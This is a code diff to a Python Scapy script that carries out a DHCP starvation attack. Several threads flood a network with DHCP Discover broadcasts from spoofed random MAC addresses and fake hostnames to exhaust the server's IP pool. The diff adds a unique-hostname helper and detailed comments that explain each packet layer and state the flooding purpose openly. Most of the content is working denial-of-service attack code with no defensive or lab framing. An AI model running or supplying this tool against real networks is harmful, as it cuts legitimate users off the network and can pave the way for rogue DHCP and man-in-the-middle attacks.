@@ -6,18 +6,56 @@ import threading
 import argparse
 import ipaddress
 
-def generate_random_mac():
+used_hostnames = set() 
+hostnames_lock = threading.Lock() 
+
+def generate_unique_hostname(): 
+    while True: 
+        name = f"fake-client-{randint(1, 10000)}"
+        with hostnames_lock:
+            if name not in used_hostnames:
+                used_hostnames.add(name)
+                return name
+
+def generate_random_mac():  # Generates a 6 byte random MAC address
     return ":".join([f"{randint(0x00, 0xff):02x}" for _ in range(6)])
 
 def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, duration=60):
     def starvation_thread():
         end_time = time.time() + duration
         while time.time() < end_time:
-            # Generate random MAC and hostname for each request
+            # Generate random fake MAC and hostname for each request
             mac = generate_random_mac()
-            hostname = f"fake-client-{randint(1, 10000)}"
-            
-            # Craft DHCP Discover packet
+            hostname = generate_unique_hostname()
+
+            # This packet is used to flood the legitimate DHCP server
+            # and exhaust its IP pool (DHCP starvation attack).
+            #
+            # Packet Structure (Layer by Layer):
+            #
+            # 1. Ethernet Layer:
+            #    - src: Fake MAC address (spoofed for each request)
+            #    - dst: Broadcast address (ff:ff:ff:ff:ff:ff), so all hosts see it
+            #
+            # 2. IP Layer:
+            #    - src: 0.0.0.0 (client has no IP yet)
+            #    - dst: 255.255.255.255 (broadcast to all devices on LAN)
+            #
+            # 3. UDP Layer:  (Not TCP, because DHCP uses UDP as it's connectionless)
+            #    - sport: 68 (DHCP client port)
+            #    - dport: 67 (DHCP server port)
+            #
+            # 4. BOOTP Layer: (DHCP is built on top of BOOTP.)
+            #    - chaddr: Client hardware address (fake MAC, in bytes)
+            #    - xid: Random transaction ID to identify request-response pair
+            #
+            # 5. DHCP Options:
+            #    - message-type: 'discover' (DHCP discovery message)
+            #    - client_id: The same fake MAC used for chaddr
+            #    - hostname: A randomly generated fake hostname (e.g., "fake-client-123")
+            #    - param_req_list: A list of parameters the client wants (e.g., subnet mask, gateway, DNS, etc.)
+            #    - end: Indicates end of DHCP options
+
             dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                            IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / \
@@ -29,7 +67,7 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
                                         "end"])
             
             # Send the packet
-            sendp(dhcp_discover, iface=interface, verbose=0)
+            sendp(dhcp_discover, iface=interface, verbose=0) # via Scapy
             time.sleep(0.01)  # Small delay to avoid overwhelming the system
 
     # Start multiple threads for more effective starvation
